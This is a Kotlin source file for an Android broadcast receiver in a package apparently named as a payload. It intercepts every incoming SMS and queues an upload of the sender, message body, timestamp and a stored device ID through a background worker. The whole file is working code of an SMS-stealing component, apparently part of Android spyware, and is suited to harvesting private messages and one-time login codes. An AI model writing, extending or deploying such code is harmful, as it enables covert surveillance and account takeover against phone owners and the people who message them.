package com.payload.jansiix0ne.broadcast

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import androidx.work.Data
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.payload.jansiix0ne.worker.SmsUploadWorker

class Receiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val pendingResult = goAsync()
            
            try {
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                messages?.forEach { smsMessage ->
                    val from = smsMessage.displayOriginatingAddress
                    val messageBody = smsMessage.messageBody
                    val timestamp = smsMessage.timestampMillis
                    
                    Log.d("Receiver", "SMS received from: $from, message: $messageBody")
                    
                    // Upload SMS using WorkManager
                    val inputData = Data.Builder()
                        .putString("from", from)
                        .putString("message", messageBody)
                        .putLong("time", timestamp)
                        .putString("deviceId", getDeviceId(context))
                        .build()
                    
                    val uploadWork = OneTimeWorkRequestBuilder<SmsUploadWorker>()
                        .setInputData(inputData)
                        .build()
                    
                    context?.let {
                        WorkManager.getInstance(it).enqueue(uploadWork)
                    }
                }
            } catch (e: Exception) {
                Log.e("Receiver", "Error processing SMS", e)
            } finally {
                pendingResult.finish()
            }
        }
    }
    
    private fun getDeviceId(context: Context?): String {
        context ?: return ""
        val prefs = context.getSharedPreferences("device_info_prefs", Context.MODE_PRIVATE)
        return prefs.getString("device_id", "") ?: ""
    }
}
